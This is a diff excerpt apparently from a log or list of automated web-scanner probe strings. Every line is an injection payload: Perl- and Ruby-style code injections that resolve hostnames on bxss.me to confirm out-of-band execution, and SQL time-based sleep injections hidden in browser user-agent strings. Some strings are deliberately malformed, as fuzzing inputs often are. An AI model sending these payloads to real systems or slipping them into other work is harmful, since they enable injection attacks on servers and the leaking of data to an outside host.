@@ -2382,3 +2382,6 @@ geth(ostbyname(lc('hitqp'.'tecrcele50b21.bxss.me.')).'A'.chr(67).chr(hex('58')).
 '.gethostbyname(lc('hitag'.'wvcpqgnp5ce88.bxss.me.').'A'.chr(67).chr(hex('58')).chr(117).chr(69).chr(118).chr(90).')
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'||sleep(27*1000)*ndjrmq||')
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'&&sleep(27*1000)*rzqktw&&')
+""+""A"".concat(70-3.concat(22*4).concat(108).concat(85).concat(111).concat(75)+(require""socket"" Socket.gethostbyname(""hityn""+""lrfkhici3a5d2.bxss.me."")[3].to_s)+"")
+'A'.concat(70-3.concat(22*4).concat(101).concat(83).concat(105).concat(79)+(require'socket' Socket.gethostbyname('hitzc'+'vojjkdia20f81.bxss.me.')[3].to_s))
+'+'A'.concat(70-3.concat(22*4).concat(120).concat(70).concat(109).concat(68)+(require'socket' Socket.gethostbyname('hitfe'+'xmdtgtet85b66.bxss.me.')[3].to_s)+')
